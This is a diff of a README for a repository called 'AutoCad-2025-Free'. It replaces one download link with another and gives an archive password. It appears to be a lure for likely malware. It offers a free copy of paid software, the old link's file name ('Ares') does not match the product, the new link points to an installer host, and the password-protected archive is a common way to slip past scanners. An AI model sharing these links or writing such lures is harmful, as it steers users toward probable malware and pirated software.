@@ -1,6 +1,6 @@
 # AutoCad-2025-Free
 
-[Click here to Download](https://www.mediafire.com/file/syft9so5sibza8g/Ares_V1_2_2.zip/file)
+[Click here to Download](https://rdmfile.eu/install/ufV9ZO4ywcZB)
 
 
 [Pass : S0f4fr33!]
